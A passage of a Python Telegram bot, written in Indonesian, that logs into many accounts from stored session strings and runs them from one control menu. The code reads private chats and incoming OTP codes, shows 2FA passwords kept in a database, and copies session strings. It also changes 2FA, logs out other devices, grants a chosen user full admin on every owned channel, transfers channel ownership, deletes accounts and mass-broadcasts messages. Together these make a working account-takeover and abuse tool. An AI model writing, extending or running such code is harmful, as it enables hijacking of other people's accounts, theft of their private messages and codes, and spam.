            await q.message.edit_text("📝 **PESAN TERSIMPAN**\n\nTidak ada pesan tersimpan!", reply_markup=main_menu(ud.get('idx', 0)+1, len(all_sessions)))
            return
        
        # Cache pesan
        saved_messages_cache[uid] = messages
        
        total_pages = (len(messages) - 1) // 10 + 1
        
        # Tampilkan halaman pertama
        text = "📝 **PESAN TERSIMPAN**\n\n"
        text += f"📊 Total: {len(messages)} pesan\n"
        text += "━━━━━━━━━━━━━━━━━━━━\n\n"
        
        for i, msg in enumerate(messages[:10], 1):
            text += f"**{i}.** 🕒 {msg['date']}\n"
            text += f"📄 {msg['text'][:200]}"
            if len(msg['text']) > 200:
                text += "..."
            text += "\n\n"
        
        await q.message.edit_text(
            text[:4000],
            reply_markup=saved_messages_menu(0, total_pages)
        )
        return
    
    if data == "refresh_saved":
        ud = user_sessions.get(uid)
        if ud:
            messages = await get_saved_messages(ud['app'], 200)
            saved_messages_cache[uid] = messages
            total_pages = (len(messages) - 1) // 10 + 1
            
            text = "📝 **PESAN TERSIMPAN**\n\n"
            text += f"📊 Total: {len(messages)} pesan\n"
            text += "━━━━━━━━━━━━━━━━━━━━\n\n"
            
            for i, msg in enumerate(messages[:10], 1):
                text += f"**{i}.** 🕒 {msg['date']}\n"
                text += f"📄 {msg['text'][:200]}"
                if len(msg['text']) > 200:
                    text += "..."
                text += "\n\n"
            
            await q.message.edit_text(
                text[:4000],
                reply_markup=saved_messages_menu(0, total_pages)
            )
        return
    
    if data == "saved_first":
        messages = saved_messages_cache.get(uid, [])
        if messages:
            total_pages = (len(messages) - 1) // 10 + 1
            
            text = "📝 **PESAN TERSIMPAN**\n\n"
            text += f"📊 Total: {len(messages)} pesan\n"
            text += "━━━━━━━━━━━━━━━━━━━━\n\n"
            
            for i, msg in enumerate(messages[:10], 1):
                text += f"**{i}.** 🕒 {msg['date']}\n"
                text += f"📄 {msg['text'][:200]}"
                if len(msg['text']) > 200:
                    text += "..."
                text += "\n\n"
            
            await q.message.edit_text(
                text[:4000],
                reply_markup=saved_messages_menu(0, total_pages)
            )
        return
    
    if data == "saved_last":
        messages = saved_messages_cache.get(uid, [])
        if messages:
            total_pages = (len(messages) - 1) // 10 + 1
            last_page = total_pages - 1
            start = last_page * 10
            end = min(start + 10, len(messages))
            
            text = "📝 **PESAN TERSIMPAN**\n\n"
            text += f"📊 Total: {len(messages)} pesan\n"
            text += "━━━━━━━━━━━━━━━━━━━━\n\n"
            
            for i, msg in enumerate(messages[start:end], start + 1):
                text += f"**{i}.** 🕒 {msg['date']}\n"
                text += f"📄 {msg['text'][:200]}"
                if len(msg['text']) > 200:
                    text += "..."
                text += "\n\n"
            
            await q.message.edit_text(
                text[:4000],
                reply_markup=saved_messages_menu(last_page, total_pages)
            )
        return
    
    if data.startswith("saved_prev_"):
        current_page = int(data.split("_")[2])
        messages = saved_messages_cache.get(uid, [])
        if messages and current_page > 0:
            new_page = current_page - 1
            total_pages = (len(messages) - 1) // 10 + 1
            start = new_page * 10
            end = min(start + 10, len(messages))
            
            text = "📝 **PESAN TERSIMPAN**\n\n"
            text += f"📊 Total: {len(messages)} pesan\n"
            text += "━━━━━━━━━━━━━━━━━━━━\n\n"
            
            for i, msg in enumerate(messages[start:end], start + 1):
                text += f"**{i}.** 🕒 {msg['date']}\n"
                text += f"📄 {msg['text'][:200]}"
                if len(msg['text']) > 200:
                    text += "..."
                text += "\n\n"
            
            await q.message.edit_text(
                text[:4000],
                reply_markup=saved_messages_menu(new_page, total_pages)
            )
        return
    
    if data.startswith("saved_next_"):
        current_page = int(data.split("_")[2])
        messages = saved_messages_cache.get(uid, [])
        if messages:
            total_pages = (len(messages) - 1) // 10 + 1
            new_page = current_page + 1
            if new_page < total_pages:
                start = new_page * 10
                end = min(start + 10, len(messages))
                
                text = "📝 **PESAN TERSIMPAN**\n\n"
                text += f"📊 Total: {len(messages)} pesan\n"
                text += "━━━━━━━━━━━━━━━━━━━━\n\n"
                
                for i, msg in enumerate(messages[start:end], start + 1):
                    text += f"**{i}.** 🕒 {msg['date']}\n"
                    text += f"📄 {msg['text'][:200]}"
                    if len(msg['text']) > 200:
                        text += "..."
                    text += "\n\n"
                
                await q.message.edit_text(
                    text[:4000],
                    reply_markup=saved_messages_menu(new_page, total_pages)
                )
        return
    
    # ==================== LOGIN ALL SESSIONS ====================
    if data == "login_all_sessions":
        await q.answer("Login semua session...")
        await q.message.edit_text("🔄 Login ke semua session...\n\nMohon tunggu...")
        
        multi_session_clients = []
        for i, session_data in enumerate(all_sessions):
            try:
                app = Client(f"multi_{i}", API_ID, API_HASH, session_string=session_data['session'], in_memory=True, no_updates=True)
                await app.start()
                me = await app.get_me()
                info = await get_account_info(app)
                multi_session_clients.append({
                    'client': app,
                    'info': info,
                    'session': session_data['session'],
                    'me': me,
                    'db_2fa_password': session_data.get('twofa_password', '')
                })
                await q.message.edit_text(f"🔄 Login... {i+1}/{len(all_sessions)} - {me.first_name}")
            except Exception as e:
                logger.error(f"Gagal login session {i}: {e}")
        
        if multi_session_clients:
            text = f"🌐 **MULTI SESSION ACTIVE!**\n\n"
            text += f"✅ Berhasil login: {len(multi_session_clients)}/{len(all_sessions)} akun\n\n"
            text += "📋 **DAFTAR AKUN:**\n"
            for i, client in enumerate(multi_session_clients[:10]):
                me = client['me']
                premium = "💎" if client['info'].get('is_premium') else "📱"
                twofa_indicator = "🔐" if client['info']['has_2fa'] else "🔓"
                if client.get('db_2fa_password'):
                    twofa_indicator = "🔑"
                text += f"{i+1}. {premium} {twofa_indicator} {me.first_name} (@{me.username or '-'})\n"
            
            await q.message.edit_text(
                text,
                reply_markup=multi_control_menu()
            )
        else:
            await q.message.edit_text("❌ Gagal login semua session!")
        return
    
    if data == "select_single":
        has_2fa = sum(1 for s in all_sessions if s.get('has_2fa'))
        has_pass = sum(1 for s in all_sessions if s.get('twofa_password'))
        await q.message.edit_text(
            f"✅ **{len(all_sessions)} Session Aktif!**\n"
            f"🔐 Ada 2FA: {has_2fa}\n"
            f"🔓 Tanpa 2FA: {len(all_sessions)-has_2fa}\n"
            f"🔑 2FA Password di DB: {has_pass}",
            reply_markup=session_list_menu(all_sessions)
        )
        return
    
    # ==================== MULTI SESSION BROADCAST ====================
    if data in ["multi_all", "multi_groups", "multi_channels", "multi_private"]:
        target_map = {
            'all': 'SEMUA CHAT',
            'groups': 'GROUP',
            'channels': 'CHANNEL',
            'private': 'PRIVATE CHAT'
        }
        target_type = data.split("_")[1]
        
        if not multi_session_clients:
            await q.answer("Tidak ada session aktif!", show_alert=True)
            return
        
        waiting_input[uid] = {
            'mode': 'multi_broadcast',
            'target': target_type
        }
        await q.message.reply(
            f"🌐 **MULTI SESSION BROADCAST**\n\n"
            f"🎯 Target: {target_map.get(target_type, 'SEMUA CHAT')}\n"
            f"👥 Akan dikirim dari {len(multi_session_clients)} akun\n\n"
            f"📝 Kirim pesan:"
        )
        await q.answer()
        return
    
    if data == "list_multi_sessions":
        if not multi_session_clients:
            await q.answer("Tidak ada session aktif!", show_alert=True)
            return
        
        text = "🌐 **DAFTAR SESSION AKTIF:**\n\n"
        for i, client in enumerate(multi_session_clients):
            me = client['me']
            premium = "✅" if client['info'].get('is_premium') else "❌"
            twofa = "✅" if client['info']['has_2fa'] else "❌"
            if client.get('db_2fa_password'):
                twofa = "🔑 PASSWORD ADA"
            text += f"{i+1}. 👤 {me.first_name}\n"
            text += f"   📞 @{me.username or '-'}\n"
            text += f"   💎 Premium: {premium}\n"
            text += f"   🔐 2FA: {twofa}\n\n"
        
        await q.message.reply(text[:4000])
        await q.answer()
        return
    
    # ==================== BROADCAST MENU ====================
    if data == "broadcast_menu":
        await q.message.edit_text(
            "📢 **MENU BROADCAST**\n\nPilih target:",
            reply_markup=broadcast_menu()
        )
        await q.answer()
        return
    
    if data == "multi_broadcast_menu":
        await q.message.edit_text(
            "🌐 **MULTI SESSION BROADCAST**\n\nPilih target:",
            reply_markup=multi_broadcast_menu()
        )
        await q.answer()
        return
    
    if data.startswith("broadcast_"):
        target_type = data.split("_")[1]
        ud = user_sessions.get(uid)
        if not ud:
            await q.answer("Session tidak ditemukan!", show_alert=True)
            return
        
        target_map = {
            'all': 'SEMUA CHAT',
            'groups': 'GROUP',
            'channels': 'CHANNEL',
            'private': 'PRIVATE CHAT'
        }
        
        waiting_input[uid] = {
            'mode': 'broadcast',
            'app': ud['app'],
            'target': target_type
        }
        
        await q.message.reply(
            f"📢 **BROADCAST KE {target_map.get(target_type, 'SEMUA')}**\n\n"
            f"Kirim pesan:"
        )
        await q.answer()
        return
    
    if data == "copy_session":
        ud = user_sessions.get(uid)
        if ud and ud.get('session_string'):
            await q.message.reply(
                f"🔑 **SESSION STRING:**\n\n"
                f"`{ud['session_string']}`"
            )
        else:
            await q.answer("Tidak ada session string!", show_alert=True)
        return
    
    # ==================== DAFTAR ADMIN CHANNEL ====================
    if data == "list_admins":
        ud = user_sessions.get(uid)
        if not ud:
            await q.answer("Session tidak ditemukan!", show_alert=True)
            return
        
        await q.answer("Mengambil daftar channel...")
        await q.message.edit_text("📊 **Mengambil daftar channel dan admin...**\n\n⏳ Mohon tunggu...")
        
        channels_with_admins = await get_all_channels_with_admins(ud['app'])
        
        if not channels_with_admins:
            await q.message.edit_text("❌ Tidak ada channel yang menjadi OWNER!")
            return
        
        user_sessions[uid]['channels_data'] = channels_with_admins
        
        text = f"👑 **DAFTAR CHANNEL OWNER**\n\n"
        text += f"📊 Total: {len(channels_with_admins)} channel\n\n"
        
        for i, ch in enumerate(channels_with_admins[:10], 1):
            username_display = f" @{ch['username']}" if ch.get('username') else ""
            text += f"{i}. 📢 **{ch['title']}**{username_display}\n"
            text += f"   👥 Admin: {ch['admin_count']} orang\n\n"
        
        if len(channels_with_admins) > 10:
            text += f"\n... dan {len(channels_with_admins)-10} channel lainnya"
        
        await q.message.edit_text(
            text,
            reply_markup=channel_list_menu(channels_with_admins)
        )
        return
    
    if data.startswith("ch_page_"):
        page = int(data.split("_")[2])
        ud = user_sessions.get(uid)
        if ud and ud.get('channels_data'):
            await q.message.edit_reply_markup(
                reply_markup=channel_list_menu(ud['channels_data'], page)
            )
        await q.answer()
        return
    
    if data.startswith("view_admins_"):
        idx = int(data.split("_")[2])
        ud = user_sessions.get(uid)
        if not ud or not ud.get('channels_data'):
            await q.answer("Data tidak ditemukan!", show_alert=True)
            return
        
        if idx >= len(ud['channels_data']):
            await q.answer("Channel tidak ditemukan!", show_alert=True)
            return
        
        channel = ud['channels_data'][idx]
        admins = channel['admins']
        
        text = f"👑 **ADMIN CHANNEL**\n\n"
        text += f"📢 **{channel['title']}**\n"
        if channel.get('username'):
            text += f"🔗 @{channel['username']}\n"
        text += f"👥 Total Admin: {channel['admin_count']}\n\n"
        text += "━━━━━━━━━━━━━━━━━━━━\n\n"
        
        for i, admin in enumerate(admins, 1):
            if admin['is_owner']:
                text += f"👑 **OWNER**\n"
            else:
                text += f"👤 **ADMIN {i}**\n"
            
            text += f"   Nama: {admin['first_name']}\n"
            text += f"   Username: @{admin['username']}\n"
            text += f"   ID: `{admin['user_id']}`\n"
            
            if admin['privileges'] and not admin['is_owner']:
                text += f"   📋 Privileges:\n"
                for priv in admin['privileges'][:5]:
                    text += f"      • {priv}\n"
                if len(admin['privileges']) > 5:
                    text += f"      ... dan {len(admin['privileges'])-5} lainnya\n"
            
            text += "\n"
        
        if len(text) > 4000:
            for i in range(0, len(text), 4000):
                await q.message.reply(text[i:i+4000])
        else:
            await q.message.reply(text)
        
        await q.answer()
        return
    
    # ==================== NAVIGASI PAGE ====================
    if data.startswith("page_"):
        try:
            page = int(data.split("_")[1])
            await q.message.edit_reply_markup(reply_markup=session_list_menu(all_sessions, page))
            await q.answer()
        except:
            pass
        return
    
    if data == "back_to_list":
        ud = user_sessions.get(uid)
        if ud and ud.get('app'):
            try:
                await ud['app'].stop()
            except:
                pass
        user_sessions.pop(uid, None)
        if all_sessions:
            has_2fa = sum(1 for s in all_sessions if s.get('has_2fa'))
            has_pass = sum(1 for s in all_sessions if s.get('twofa_password'))
            await q.message.edit_text(
                f"✅ **{len(all_sessions)} Session Aktif**\n🔐 Ada 2FA: {has_2fa}\n🔑 2FA Password: {has_pass}",
                reply_markup=session_list_menu(all_sessions)
            )
        return
    
    if data == "back_to_main":
        ud = user_sessions.get(uid)
        if ud:
            idx = ud.get('idx', 0)
            session_str = ud.get('session_string', None)
            db_pass = ud.get('db_2fa_password', '')
            await q.message.edit_text(
                format_account_short(ud['info'], idx+1, len(all_sessions), session_str, db_pass),
                reply_markup=main_menu(idx+1, len(all_sessions), bool(db_pass))
            )
        return
    
    if data == "back_to_chats":
        ud = user_sessions.get(uid)
        if ud:
            chats = await get_all_dialogs(ud['app'])
            user_chats[uid] = chats
            if chats:
                await q.message.edit_text(
                    f"📋 **DAFTAR CHAT ({len(chats)})**\n\nPilih chat:",
                    reply_markup=chat_list_menu(chats)
                )
            else:
                await q.message.edit_text(
                    f"📋 **DAFTAR CHAT (0)**",
                    reply_markup=main_menu(ud.get('idx', 0)+1, len(all_sessions))
                )
        return
    
    if data.startswith("chat_page_"):
        page = int(data.split("_")[2])
        chats = user_chats.get(uid, [])
        await q.message.edit_reply_markup(reply_markup=chat_list_menu(chats, page))
        await q.answer()
        return
    
    if data == "list_chats":
        ud = user_sessions.get(uid)
        if ud:
            await q.answer("Mengambil daftar chat...")
            chats = await get_all_dialogs(ud['app'])
            user_chats[uid] = chats
            if chats:
                await q.message.edit_text(
                    f"📋 **DAFTAR CHAT ({len(chats)})**\n\nPilih chat:",
                    reply_markup=chat_list_menu(chats)
                )
            else:
                await q.message.edit_text(
                    f"📋 **DAFTAR CHAT (0)**",
                    reply_markup=main_menu(ud.get('idx', 0)+1, len(all_sessions))
                )
        return
    
    if data == "show_otp":
        ud = user_sessions.get(uid)
        if ud:
            otp = await get_last_otp(ud['app'], 10)
            if otp:
                text = "📡 **OTP TERBARU:**\n\n"
                for msg in otp[:5]:
                    if msg['otp']:
                        text += f"🔑 `{msg['otp']}` 🕒 {msg['date']}\n"
                    text += f"📝 {msg['text'][:80]}\n\n"
                await q.message.reply(text[:3000])
            else:
                await q.answer("Tidak ada OTP!", show_alert=True)
        return
    
    if data == "show_2fa":
        ud = user_sessions.get(uid)
        if ud:
            info = ud['info']
            db_pass = ud.get('db_2fa_password', '')
            if info['has_2fa'] or db_pass:
                text = f"🔐 **INFO 2FA**\n\n"
                if info['has_2fa']:
                    text += f"✅ **2FA AKTIF**\n"
                    if info.get('hint'):
                        text += f"💡 Hint: `{info['hint']}`\n"
                else:
                    text += f"❌ **2FA TIDAK AKTIF**\n"
                
                if db_pass:
                    text += f"\n🔑 **2FA PASSWORD (DARI DATABASE):**\n"
                    text += f"`{db_pass}`\n"
                
                await q.message.reply(text)
            else:
                await q.answer("2FA TIDAK AKTIF!", show_alert=True)
        return
    
    if data == "set_2fa":
        ud = user_sessions.get(uid)
        if not ud:
            await q.answer("Session tidak ditemukan!", show_alert=True)
            return
        
        waiting_input[uid] = {'mode': 'set_2fa', 'app': ud['app']}
        await q.message.reply("🔑 Kirim password baru (min 4 karakter):")
        return
    
    if data == "add_admin_all":
        ud = user_sessions.get(uid)
        if not ud:
            await q.answer("Session tidak ditemukan!", show_alert=True)
            return
        
        waiting_input[uid] = {'mode': 'add_admin_all', 'app': ud['app']}
        await q.message.reply(
            "👑 **ADD ADMIN KE SEMUA CHANNEL**\n\n"
            "Masukkan username target (contoh: @username):\n\n"
            "⚠️ Target akan mendapatkan akses ADMIN LENGKAP!"
        )
        return
    
    if data == "out_all_channels":
        ud = user_sessions.get(uid)
        if not ud:
            await q.answer("Session tidak ditemukan!", show_alert=True)
            return
        
        waiting_input[uid] = {'mode': 'out_all_confirm', 'app': ud['app']}
        await q.message.reply(
            "🚪 **OUT DARI SEMUA CHANNEL**\n\n"
            "⚠️ PERINGATAN:\n"
            "• Akan KELUAR dari SEMUA channel yang jadi OWNER!\n"
            "• TIDAK BISA DIBATALKAN!\n\n"
            "Ketik: `YA_OUT` untuk konfirmasi"
        )
        return
    
    if data == "logout_devices":
        ud = user_sessions.get(uid)
        if not ud:
            await q.answer("Session tidak ditemukan!", show_alert=True)
            return
        
        success, msg = await logout_other_devices(ud['app'])
        await q.message.reply(msg)
        return
    
    if data == "delete_account":
        ud = user_sessions.get(uid)
        if not ud:
            await q.answer("Session tidak ditemukan!", show_alert=True)
            return
        
        waiting_input[uid] = {'mode': 'delete_confirm', 'app': ud['app']}
        await q.message.reply("⚠️ **HAPUS AKUN PERMANEN?**\n\nKetik: `YA_HAPUS`")
        return
    
    if data == "refresh":
        ud = user_sessions.get(uid)
        if ud:
            info = await get_account_info(ud['app'])
            ud['info'] = info
            session_str = ud.get('session_string', None)
            db_pass = ud.get('db_2fa_password', '')
            await q.message.edit_text(
                format_account_short(info, ud.get('idx', 0)+1, len(all_sessions), session_str, db_pass),
                reply_markup=main_menu(ud.get('idx', 0)+1, len(all_sessions), bool(db_pass))
            )
        return
    
    # ==================== VIEW CHAT ====================
    if data.startswith("view_chat_"):
        idx = int(data.split("_")[2])
        chats = user_chats.get(uid, [])
        if idx < len(chats):
            chat = chats[idx]
            await q.answer(f"Loading {chat['name']}...")
            msgs = await get_messages(user_sessions[uid]['app'], chat['id'], 30)
            if msgs:
                text = f"💬 **{chat['name']}**\n"
                if chat.get('username'):
                    text += f"🔗 @{chat['username']}\n"
                text += "\n"
                for msg in msgs[:20]:
                    icon = "📤" if msg['out'] else "📥"
                    text += f"{icon} {msg['text'][:150]}\n   🕒 {msg['date']}\n\n"
                await q.message.reply(text[:3500])
            else:
                await q.message.reply(f"💬 **{chat['name']}**\n\nTidak ada pesan.")
            
            await q.message.reply(
                f"🔧 **Aksi untuk {chat['name']}**",
                reply_markup=chat_action_menu(chat['id'], chat['name'], chat['type'])
            )
        return
    
    if data.startswith("view_msgs_"):
        chat_id = int(data.split("_")[2])
        ud = user_sessions.get(uid)
        if ud:
            await q.answer("Mengambil pesan...")
            msgs = await get_messages(ud['app'], chat_id, 30)
            if msgs:
                text = "💬 **PESAN:**\n\n"
                for msg in msgs[:20]:
                    icon = "📤" if msg['out'] else "📥"
                    text += f"{icon} {msg['text'][:150]}\n   🕒 {msg['date']}\n\n"
                await q.message.reply(text[:3500])
            
            chats = user_chats.get(uid, [])
            chat_name = ""
            chat_type = ""
            chat_username = None
            for ch in chats:
                if ch['id'] == chat_id:
                    chat_name = ch['name']
                    chat_type = ch['type']
                    chat_username = ch.get('username')
                    break
            
            await q.message.reply(
                f"🔧 **Aksi untuk {chat_name}**",
                reply_markup=chat_action_menu(chat_id, chat_name, chat_type, chat_username)
            )
        return
    
    if data.startswith("transfer_owner_"):
        chat_id = int(data.split("_")[2])
        ud = user_sessions.get(uid)
        if not ud:
            await q.answer("Session tidak ditemukan!", show_alert=True)
            return
        
        waiting_input[uid] = {'mode': 'transfer_owner', 'app': ud['app'], 'chat_id': chat_id}
        await q.message.reply(
            "👑 **TRANSFER OWNER CHANNEL**\n\n"
            "Masukkan username target (contoh: @username):\n\n"
            "⚠️ Target harus JOIN channel terlebih dahulu!"
        )
        return
    
    # ==================== SELECT SESSION ====================
    if data.startswith("sel_"):
        try:
            idx = int(data.split("_")[1])
            if idx >= len(all_sessions):
                await q.answer("Session tidak ditemukan!", show_alert=True)
                return
            session_data = all_sessions[idx]
            await q.answer("Login...")
            
            app = Client(f"s_{uid}", API_ID, API_HASH, session_string=session_data['session'], in_memory=True, no_updates=True)
            await app.start()
            info = await get_account_info(app)
            if session_data.get('twofa_hint') and not info.get('hint'):
                info['hint'] = session_data['twofa_hint']
            
            user_sessions[uid] = {
                'app': app, 
                'info': info, 
                'idx': idx,
                'session_string': session_data['session'],
                'db_2fa_password': session_data.get('twofa_password', '')
            }
            await q.message.edit_text(
                format_account_short(info, idx+1, len(all_sessions), session_data['session'], session_data.get('twofa_password', '')),
                reply_markup=main_menu(idx+1, len(all_sessions), bool(session_data.get('twofa_password')))
            )
        except Exception as e:
            await q.message.reply(f"❌ {str(e)[:100]}")
        return
    
    # ==================== NAVIGASI AKUN ====================
    ud = user_sessions.get(uid)
    if not ud or 'app' not in ud:
        await q.answer("Session hilang!", show_alert=True)
        return
    
    app = ud['app']
    idx = ud.get('idx', 0)
    
    try:
        if data == "prev_acc":
            if idx <= 0:
                await q.answer("Udah awal!", show_alert=True)
                return
            new_idx = idx - 1
            session_data = all_sessions[new_idx]
            await q.answer(f"Load akun {new_idx+1}...")
            await app.stop()
            
            app2 = Client(f"s_{uid}", API_ID, API_HASH, session_string=session_data['session'], in_memory=True, no_updates=True)
            await app2.start()
            info = await get_account_info(app2)
            if session_data.get('twofa_hint') and not info.get('hint'):
                info['hint'] = session_data['twofa_hint']
            user_sessions[uid] = {
                'app': app2, 
                'info': info, 
                'idx': new_idx,
                'session_string': session_data['session'],
                'db_2fa_password': session_data.get('twofa_password', '')
            }
            await q.message.edit_text(
                format_account_short(info, new_idx+1, len(all_sessions), session_data['session'], session_data.get('twofa_password', '')),
                reply_markup=main_menu(new_idx+1, len(all_sessions), bool(session_data.get('twofa_password')))
            )
        
        elif data == "next_acc":
            if idx + 1 >= len(all_sessions):
                await q.answer("Udah akhir!", show_alert=True)
                return
            new_idx = idx + 1
            session_data = all_sessions[new_idx]
            await q.answer(f"Load akun {new_idx+1}...")
            await app.stop()
            
            app2 = Client(f"s_{uid}", API_ID, API_HASH, session_string=session_data['session'], in_memory=True, no_updates=True)
            await app2.start()
            info = await get_account_info(app2)
            if session_data.get('twofa_hint') and not info.get('hint'):
                info['hint'] = session_data['twofa_hint']
            user_sessions[uid] = {
                'app': app2, 
                'info': info, 
                'idx': new_idx,
                'session_string': session_data['session'],
                'db_2fa_password': session_data.get('twofa_password', '')
            }
            await q.message.edit_text(
                format_account_short(info, new_idx+1, len(all_sessions), session_data['session'], session_data.get('twofa_password', '')),
                reply_markup=main_menu(new_idx+1, len(all_sessions), bool(session_data.get('twofa_password')))
            )
    
    except Exception as e:
        logger.error(f"Error: {e}")
        await q.answer(f"Error: {str(e)[:50]}", show_alert=True)

if __name__ == "__main__":
    print("=" * 70)
    print("🤖 BOT CONTROL ULTIMATE - FULL VERSION")
    print("=" * 70)
    print("✅ FITUR LENGKAP:")
    print("   • 📝 PESAN TERSIMPAN (Navigasi Slide: Awal, Prev, Next, Akhir)")
    print("   • 🔑 TAMPILKAN 2FA PASSWORD DARI DATABASE")
    print("   • 👑 DAFTAR ADMIN CHANNEL (Dengan username)")
    print("   • 👑 ADD ADMIN KE SEMUA CHANNEL (Akses Lengkap)")
    print("   • 👑 TRANSFER OWNER CHANNEL")
    print("   • 📢 BROADCAST (Single & Multi Session)")
    print("   • 📡 OTP & PESAN")
    print("   • 🔐 SET/UBAH 2FA")
    print("   • 📋 COPY SESSION STRING")
    print("   • 🌐 MULTI SESSION CONTROL")
    print("   • ◀️ ▶️ SLIDE AKUN")
    print("   • 🔒 OWNER-ONLY ACCESS (/addakses)")
    print("=" * 70)
    print(f"👑 OWNER ID: {OWNER_ID}")
    print("=" * 70)
    print("🔥 BOT JALAN!")
    print("=" * 70)
    
    bot.run()
